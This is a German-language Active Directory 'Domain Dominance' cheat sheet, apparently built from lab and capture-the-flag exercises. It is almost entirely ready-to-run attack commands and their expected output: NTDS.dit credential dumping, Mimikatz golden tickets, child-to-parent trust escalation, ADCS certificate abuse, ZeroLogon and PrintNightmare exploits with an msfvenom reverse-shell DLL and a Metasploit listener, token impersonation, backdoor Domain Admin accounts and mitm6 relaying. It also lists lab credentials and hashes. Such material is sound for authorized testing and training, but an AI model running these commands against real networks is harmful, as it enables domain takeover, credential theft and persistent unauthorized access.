# Domain Dominance

# Ziel der Domain Dominance Phase

- Vollständige Kontrolle über Active Directory Domain erlangen
- Zugriff auf Domain Controller etablieren
- Komplette NTDS.dit extrahieren (alle Domain Credentials)
- Golden Tickets für langfristige Kontrolle erstellen
- Parent Domain bei Child-Domain-Kompromittierung erreichen
- Alle Domain Admin Privilegien sichern

---

## Domain Controller Zugriff

### Domain Admin Verification


```bash
# Nach Privilege Escalation zu DA
whoami /groups
net group "Domain Admins" /domain
```

### Shell Access zu Domain Controller


```bash
# PSExec zum DC
impacket-psexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# WMIExec zum DC
impacket-wmiexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# SMBExec zum DC
impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# Evil-WinRM zum DC
evil-winrm -u administrator -p 'Password123!' -i 192.168.xx.x
evil-winrm -u Administrator -H 15db914be1e6a896e7692f608a9d72ef -i 10.10.255.69
```

---

## NTDS.dit Dumping

### Grundlegende NTDS.dit Extraktion


```bash
# Komplette Domain Database dumpen
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# Mit Hash statt Password
impacket-secretsdump -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69
```

**Extrahiert:**

- Alle Domain User Hashes
- krbtgt Account Hash
- Machine Account Credentials
- Group Memberships

### NTDS.dit mit nur NTLM Hashes


```bash
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x -just-dc-ntlm
```

### NTDS.dit Output speichern


```bash
# Complete Dump in Datei
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x > domain_hashes.txt

# Parent Domain Dump
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69 > parent_domain.txt
```

---

## Hash Cracking nach NTDS.dit Dump

### NTLM Hash Cracking


```bash
# Hash File erstellen
nano ntlm_hashes.txt
# Hash hinzufügen: 7facdc498ed1680c4fd1448319a8c04f

# Mit Hashcat cracken
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Gecrackte Passwords anzeigen
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

**Hash Mode:**

- `-m 1000` = NTLM

---

## Golden Ticket Creation

### Voraussetzungen sammeln


```bash
# 1. NTDS.dit dumpen für krbtgt Hash
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# 2. Domain SID ermitteln
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70
```

**Notieren:**

- krbtgt NTLM Hash
- Domain SID (z.B. `S-1-5-21-...`)
- Domain FQDN

### Golden Ticket auf Domain Controller (Mimikatz)

cmd

```cmd
# 1. Mimikatz starten
mimikatz.exe

# 2. Debug Privilegien prüfen
privilege::debug
```

**Erwartete Ausgabe:** `Privilege '20' OK`

mimikatz

```mimikatz
# 3. Kerberos Informationen extrahieren
lsadump::lsa /inject /name:krbtgt
```

**Wichtig kopieren:**

- Domain SID
- krbtgt NTLM Hash

mimikatz

```mimikatz
# 4. Golden Ticket erstellen
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-... /krbtgt:HASH_HIER /id:500 /ptt

# 5. Golden Ticket mit fiktivem User
kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111111111-2222222222 /krbtgt:8A1B2C3D4E... /id:500 /ptt

# 6. CMD mit Golden Ticket öffnen
misc::cmd
```

### Golden Ticket Parameter

|Parameter|Bedeutung|Beispiel|
|---|---|---|
|`/User:`|Benutzername (kann fiktiv sein)|`Administrator` oder `Batman`|
|`/domain:`|FQDN der Domain|`marvel.local`|
|`/sid:`|Domain SID|`S-1-5-21-...`|
|`/krbtgt:`|krbtgt NTLM Hash|Aus NTDS.dit|
|`/id:`|User RID|`500` (Administrator)|
|`/ptt`|Pass The Ticket|-|

---

## Child-to-Parent Domain Escalation

### Trust Relationship Discovery

powershell

```powershell
# Trust-Beziehungen analysieren (PowerShell auf DC)
Get-ADTrust -Filter *
```

### Credential Extraction für Trust


```bash
# Credentials auf Child DC extrahieren
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl 10.10.255.70
```

### Domain SID Enumeration


```bash
# Child Domain SID ermitteln
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70

# Trust-Beziehungen und Parent Domain SID
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

**Notieren:**

- Child Domain SID: `S-1-5-21-2241985869-2159962460-1278545866`
- Parent Domain SID: `S-1-5-21-3576695518-347000760-3731839591`
- Trust-Key: `4db3f9d7f1f1da776092e0cce7521a3f`

### DNS Setup für Parent Domain


```bash
# Critical: DNS Einträge für beide Domains
echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

### Automated Child-to-Parent Escalation


```bash
# raiseChild.py mit Child DA Hash
raiseChild.py lab.trusted.vl/cpowers -hashes :322db798a55f85f09b3d61b976a13c43
```

**Prozess:**

- Extrahiert Trust-Key
- Erstellt Inter-Realm TGT
- Kompromittiert Parent Domain
- Gibt Enterprise Admin Credentials zurück

### Parent Domain Compromise


```bash
# Parent Domain NTDS.dit dumpen
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69

# Parent DC Access
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## ADCS Certificate Authority Abuse

### Vulnerable Template Discovery


```bash
# BloodHound Collection
bloodhound-python -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d hybrid.vl -dc dc01.hybrid.vl -ns 10.10.175.181 -c all

# Certipy Vulnerability Scan
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.175.181 -vulnerable
```

**Result:**

- Template: HybridComputers (ESC1)
- Allows arbitrary UPN

### Machine Account Hash Extraction


```bash
# Keytab zu NTLM Hash
python3 keytabextract.py krb5.keytab
```

**Result:**

- NTLM: `0f916c5246fdbc7ba95dcef4126d57bd`

### Certificate Request für Administrator


```bash
# Certificate Request als Machine Account mit Administrator UPN
certipy-ad req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -target 10.10.175.181 -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

**Generiert:**

- admin.crt (Certificate)
- admin.key (Private Key)

### PassTheCert für DA Privilege


```bash
# Administrator Password ändern via Certificate
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip 10.10.175.181 -target administrator -new-pass Password123!
```

### Domain Admin Access


```bash
# Evil-WinRM mit neuem Password
evil-winrm -i 10.10.175.181 -u administrator -p 'Password123!'
```

---

## ZeroLogon (CVE-2020-1472)

### Vulnerability Check


```bash
# Test ob DC vulnerable ist
python3 zerologon_tester.py DC-NAME DC-IP

# Beispiel:
python3 zerologon_tester.py ODIN-DC 192.168.xx.x
```

### ZeroLogon Exploitation


````bash
# DC Machine Account Password nullifizieren
python3 cve-2020-1472-exploit.py DC-NAME DC-IP

# Beispiel:
python3 cve-2020-1472-exploit.py ODIN-DC 192.168.xx.x
```

**Expected Output:**
```
Performing authentication attempts...
Success! DC machine account password nullified
Target is now compromised
````

### Credential Extraction nach ZeroLogon


```bash
# NTDS.dit mit nullified Machine Account
impacket-secretsdump -just-dc domain.local/'DC-NAME$'@DC-IP -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Beispiel:
impacket-secretsdump -just-dc MARVEL.local/'ODIN-DC$'@192.168.xx.x -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**Extrahiert:**

- Alle Domain User Hashes
- Administrator Hash
- krbtgt Hash

### Domain Controller Restoration (CRITICAL!)


```bash
# Step 1: Original Machine Account Hash aus secretsdump extrahieren
# Format: ODIN-DC$:aad3b435b51404eeaad3b435b51404ee:ORIGINAL_HASH

# Step 2: Original Password wiederherstellen
python3 restorepassword.py domain.local/DC-NAME@DC-NAME -target-ip DC-IP -hexpass ORIGINAL_HEX_PASSWORD

# Beispiel:
python3 restorepassword.py MARVEL.local/ODIN-DC@ODIN-DC -target-ip 192.168.xx.x -hexpass [EXTRACTED_HEX_PASSWORD]
```

### Professional Pentest Approach


```text
⚠️ EMPFOHLEN:
1. Test mit zerologon_tester.py
2. Vulnerability dokumentieren
3. NICHT exploiten (Destruction Risk)
4. Report mit Remediation Steps
```

---

## PrintNightmare (CVE-2021-1675)

### Vulnerability Check


````bash
# Print Spooler Service prüfen
impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
```

**Expected Vulnerable Output:**
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
````

### Environment Setup


```bash
# Modified Impacket installieren
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

# Exploit herunterladen
# Von: https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
mousepad CVE-2021-1675.py
# Code einfügen und speichern
```

### Payload Generation



```bash
# Malicious DLL erstellen
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.xx.x LPORT=7777 -f dll > shell.dll
```

### Metasploit Listener


```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.xx.x
set LPORT 7777
run
```

### SMB Server für Payload


```bash
# SMB Server starten
smbserver.py share $(pwd) -smb2support
```

### PrintNightmare Exploitation


```bash
# Exploit ausführen gegen Workstation
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'

# Gegen Domain Controller
python3 CVE-2021-1675.py marvel.local/mmustermann:Password1@192.168.xx.x '\\192.168.xx.x\share\shell.dll'
```

**Expected Result:**


```bash
# In Metasploit Handler
[*] Sending stage (200262 bytes) to TARGET_IP
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Token Impersonation zu Domain Admin

### Metasploit PSExec Setup


```bash
msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.xx.x
set SMBUser mmustermann
set SMBPass Password1
set SMBDomain MARVEL.local
set LHOST [YOUR_KALI_IP]
set LPORT [YOUR_PORT]
run
```

### Token Impersonation Module laden


```bash
# In Meterpreter Session
load incognito
list_tokens -u
```

### Domain Administrator Token


```bash
# Nach Admin Login auf Target
list_tokens -u

# Administrator Token impersonieren
impersonate_token marvel\\\\administrator

# Verification
shell
whoami   # Should show MARVEL\Administrator
```

### Domain Admin Commands

cmd

```cmd
# Domain User erstellen
net user /add hawkeye Password1@ /domain

# Zu Domain Admins hinzufügen
net group "Domain Admins" hawkeye /ADD /DOMAIN

# Für deutsche Systeme
net group "Domänen-Admins" hawkeye /ADD /DOMAIN
```

### Domain Compromise Verification


```bash
# NTDS.dit mit neuem DA Account
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

---

## mitm6 für Domain Compromise

### Basic mitm6 Attack


````bash
# Terminal 1: mitm6 starten
sudo mitm6 -d marvel.local

# Terminal 2: LDAPS Relay
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme
```

**Parameter:**
- **-6** = IPv6 Support
- **-t ldaps://192.168.xx.x** = Target Domain Controller
- **-wh fakewpad.marvel.local** = Fake WPAD
- **-l lootme** = Output Directory

### Expected Results bei Computer Account
```
[*] HTTPD(80): Authenticating against ldaps://192.168.xx.x as MARVEL/MAXMUSTERMANN$ SUCCEED
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

### Expected Results bei Administrator
```
[*] HTTPD(80): Authenticating against ldaps://192.168.xx.x as MARVEL/ADMINISTRATOR SUCCEED
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group
[*] Adding new user with username: hSnKXmKTJa and password: C:hEI7O(MO}Y}F/
[*] Success! User hSnKXmKTJa now has Replication-Get-Changes-All privileges on the domain
````

### Collected Data untersuchen


```bash
# Captured Domain Data prüfen
ls -la lootme/
cat lootme/domain_*

# HTML Reports
firefox lootme/domain_users.html
firefox lootme/domain_computers.html
```

---

## Flag Hunting auf Domain Controller

### PowerShell Flag Search

powershell

```powershell
# In Evil-WinRM oder PSExec Session auf DC
Get-ChildItem -Path C:\ -Include "user.txt", "*flag*", "root.txt" -File -Recurse -ErrorAction SilentlyContinue
```

### Child Domain Flags


```bash
# Child DC mit DA Hash
evil-winrm -i 10.10.255.70 -u cpowers -H 322db798a55f85f09b3d61b976a13c43
```

powershell

```powershell
# Flag lesen
type C:\Users\Administrator\Desktop\User.txt
type C:\Users\ewalters\Desktop\User.txt
```

### Parent Domain Flag (EFS Problem)

cmd

```cmd
# Ownership übernehmen
takeown /f "C:\Users\Administrator\Desktop\root.txt"

# Berechtigungen setzen
icacls "C:\Users\Administrator\Desktop\root.txt" /grant Administrator:F

# Flag lesen
type C:\Users\Administrator\Desktop\root.txt
```

---

## Domain Dominance Workflow

### Phase 1: Domain Admin Escalation


```bash
# 1. Token Impersonation oder Service Account Abuse
# (siehe relevante Sections oben)

# 2. Domain Admin Gruppe verifizieren
net group "Domain Admins" /domain

# 3. DC Access testen
evil-winrm -u administrator -p 'Password123!' -i 192.168.xx.x
```

### Phase 2: NTDS.dit Extraction


```bash
# 1. Complete Domain Database dump
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x > domain_hashes.txt

# 2. krbtgt Hash extrahieren
grep krbtgt domain_hashes.txt

# 3. Domain SID notieren
lookupsid.py marvel.local/hawkeye:'Password1@'@192.168.xx.x
```

### Phase 3: Golden Ticket Creation

bash

```bash
# 1. Auf Windows System mit Mimikatz
# (siehe Golden Ticket Section)

# 2. Golden Ticket testen
# Via misc::cmd in Mimikatz

# 3. Zugriff verifizieren
dir \\DC01\C$
```

### Phase 4: Parent Domain (wenn Child Domain)


```bash
# 1. Trust Relationships prüfen
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts

# 2. DNS Setup
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts

# 3. raiseChild.py
raiseChild.py lab.trusted.vl/cpowers -hashes :322db798a55f85f09b3d61b976a13c43

# 4. Parent NTDS.dit
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69
```

---

## Key Credentials & Hashes Summary

|Type|Value|
|---|---|
|**krbtgt Hash (Child)**|`c7a03c565c68c6fac5f8913fab576ebd`|
|**cpowers NT Hash**|`322db798a55f85f09b3d61b976a13c43`|
|**Trust-Key**|`4db3f9d7f1f1da776092e0cce7521a3f`|
|**Parent Admin Hash**|`15db914be1e6a896e7692f608a9d72ef`|
|**Child Domain SID**|`S-1-5-21-2241985869-2159962460-1278545866`|
|**Parent Domain SID**|`S-1-5-21-3576695518-347000760-3731839591`|

---

## Troubleshooting

### NTDS.dit Dump Failures


```bash
# Wenn secretsdump fehlschlägt:
# 1. Domain Admin Rechte vorhanden?
# 2. DC erreichbar?
# 3. Credentials korrekt?
# 4. RPC/SMB Ports offen?

# Connectivity testen
crackmapexec smb 192.168.xx.x -u hawkeye -p 'Password1@' -d MARVEL.local
```

### Golden Ticket Issues


```bash
# Wenn Golden Ticket nicht funktioniert:
# 1. krbtgt Hash korrekt?
# 2. Domain SID exakt?
# 3. Domain FQDN korrekt?
# 4. RID 500 gesetzt?

# Domain SID erneut prüfen
lookupsid.py marvel.local/hawkeye:'Password1@'@192.168.xx.x
```

### Child-to-Parent Escalation Issues


```bash
# Wenn raiseChild.py fehlschlägt:
# 1. DNS Entries für beide Domains gesetzt?
# 2. Child DA Credentials korrekt?
# 3. Trust Relationship existiert?
# 4. Network Connectivity zu beiden DCs?

# Trust prüfen
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

### ZeroLogon Restoration Failures


```bash
# Wenn DC Restore fehlschlägt:
# 1. Original Hex Password korrekt extrahiert?
# 2. Hex Format ohne Spaces?
# 3. DC Name exakt?
# 4. Network Connectivity?

# Bei Failure: Contact Domain Administrator
# DC könnte permanent beschädigt sein
```

---

## Success Indicators

### Domain Dominance Success

- ✅ NTDS.dit komplett extrahiert
- ✅ krbtgt Hash gesichert
- ✅ Golden Ticket funktional
- ✅ Alle Domain Admin Accounts bekannt
- ✅ Shell Access zu allen DCs

### Parent Domain Success (bei Multi-Domain)

- ✅ Trust Relationship identifiziert
- ✅ raiseChild.py erfolgreich
- ✅ Parent NTDS.dit extrahiert
- ✅ Enterprise Admin Privilegien erreicht
- ✅ Zugriff auf alle Child Domains

### Complete Compromise Indicators

- ✅ Alle Domain User Hashes offline
- ✅ Multiple DA Backdoor Accounts
- ✅ Golden Tickets für 10 Jahre
- ✅ ADCS Certificate Authority kompromittiert (wenn vorhanden)
- ✅ Flags von allen DCs gesammelt

